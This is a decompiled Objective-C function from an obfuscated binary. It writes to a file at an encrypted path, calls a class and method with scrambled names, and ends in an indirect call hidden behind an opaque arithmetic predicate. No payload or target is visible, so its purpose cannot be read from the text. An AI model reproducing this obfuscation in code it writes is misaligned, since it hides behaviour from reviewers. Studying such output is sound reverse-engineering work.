/*
 * func-name: sub_1000E3D4C
 * func-address: 0x1000e3d4c
 * export-type: decompile
 * callers: none
 * callees: 0x10011f1a8, 0x100798e78, 0x100798e90
 */

__int64 sub_1000E3D4C()
{
  void *v0; // x20
  void *v1; // x22
  __int64 (*v2)(void); // x0

  _objc_msgSend(
    v1,
    "writeToFile:atomically:",
    CFSTR("U\x04d=\xCF\xED7\xA7\x9F\xD4\x3D\xAB\xA0\xF7\xA0\xC4\xAA\xF7\x90\x35\xFFx \x04HO\xE9\xF1\x704i\xC5\x38\xA3\x0FP\xA9\xFCW\xF2\x15\x6C\x5EM\xEE\x11\xB0\xAC\xAC\xD1\x77\xE4\xF2\x8E9÷}"),
    0);
  objc_release(v1);
  objc_release(v0);
  +[i6hDNTxG b1yA1NzI:](
    &OBJC_CLASS___i6hDNTxG,
    "b1yA1NzI:",
    CFSTR("U\x04d=\xCF\xED7\xA7\x9F\xD4\x3D\xAB\xA0\xF7\xA0\xC4\xAA\xF7\x90\x35\xFFx \x04HO\xE9\xF1\x704i\xC5\x38\xA3\x0FP\xA9\xFCW\xF2\x15\x6C\x5EM\xEE\x11\xB0\xAC\xAC\xD1\x77\xE4\xF2\x8E9÷}"));
  v2 = (__int64 (*)(void))nullsub_7(*(&off_1008365C8
                                    + (478382345 * ((dword_1007FED00 * dword_1007FED04) & 0x86375E11) - 1498304130 > 0xCF8834A1)));
  return v2();
}
